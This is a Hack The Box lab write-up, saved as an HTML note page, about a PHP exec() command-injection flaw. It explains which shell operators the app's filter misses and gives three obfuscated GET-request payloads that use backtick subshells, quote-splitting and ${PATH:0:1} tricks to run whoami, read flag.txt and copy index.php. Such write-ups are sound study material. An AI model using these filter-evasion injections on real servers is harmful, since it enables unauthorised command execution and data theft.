<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PHP exec() -- HTB example 1</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>PHP exec() -- HTB example 1</h1><br/><br /><strong><h3>PHP source code</h3></strong> (index.php: <a href="https://drive.google.com/file/d/1wvI9tzPbv-6jY10QxMxKJgvIfiPu0SVM/view?usp=sharing">https://drive.google.com/file/d/1wvI9tzPbv-6jY10QxMxKJgvIfiPu0SVM/view?usp=sharing</a>)<br />In this source code we can see that PHP:<br />• execute the command exec() on the parameter $cmd on line 725<br />    <a href=""><img src="images/2449-1.png" alt="images/2449-1.png" /></a><br />• filter source($from) and destination($dest) with the function filter() on line 677<br />	<a href=""><img src="images/2449-2.png" alt="images/2449-2.png" /></a><br /><br />From the source code we can see that the function filter does not filter out:<br />• Backticks (``) → is an execution operator to create a subshell<br />	<a href=""><img src="images/2449-3.png" alt="images/2449-3.png" /></a><br />• $() → is an execution operator to create a subshell<br />	<a href=""><img src="images/2449-4.png" alt="images/2449-4.png" /></a><br />• Brace Exapansion {command1,command2} → alterntive way to create a space<br />	<a href=""><img src="images/2449-5.png" alt="images/2449-5.png" /></a><br /><br /><br /><strong><h3>Exploit (command1)</h3></strong><br /><div class="codebox"><pre>GET /index.php?to=abbc.txt`w&#39;h&#39;oa&#39;m&#39;i`&amp;from=2561732172.txt&amp;finish=1&amp;move=1 HTTP/1.1</pre></div><br />	<a href=""><img src="images/2449-6.png" alt="images/2449-6.png" /></a><br />	<a href=""><img src="images/2449-7.png" alt="images/2449-7.png" /></a><br />    <a href=""><img src="images/2449-8.png" alt="images/2449-8.png" /></a><br />    <a href=""><img src="images/2449-9.png" alt="images/2449-9.png" /></a><br />    <br /><br /><strong><h3>Exploit 2 (command2)</h3></strong><br /><div class="codebox"><pre>GET /index.php?to=abbc.txt`{c&#39;a&#39;t,${PATH:0:1}flag.txt}`&amp;from=787113764.txt&amp;finish=1&amp;move=1</pre></div><br /><a href=""><img src="images/2449-10.png" alt="images/2449-10.png" /></a><br /><a href=""><img src="images/2449-11.png" alt="images/2449-11.png" /></a><br /><br /><br /><strong><h3>Exploit 3: (command save index.php file)</h3></strong><br /><div class="codebox"><pre>GET /index.php?to=abbc.txt`{c&#39;p&#39;,${PATH:0:1}v&#39;a&#39;r${PATH:0:1}w&#39;w&#39;w${PATH:0:1}h&#39;t&#39;ml${PATH:0:1}in&#39;dex.ph&#39;p${IFS}${PATH:0:1}v&#39;a&#39;r${PATH:0:1}w&#39;w&#39;w${PATH:0:1}h&#39;t&#39;ml${PATH:0:1}fi&#39;l&#39;es${PATH:0:1}}`&amp;from=787113764.txt&amp;finish=1&amp;move=1</pre></div><br />    <a href=""><img src="images/2449-12.png" alt="images/2449-12.png" /></a><br />    <a href=""><img src="images/2449-13.png" alt="images/2449-13.png" /></a><br />    <a href=""><img src="images/2449-14.png" alt="images/2449-14.png" /></a><br />    </div>
</body>
</html>
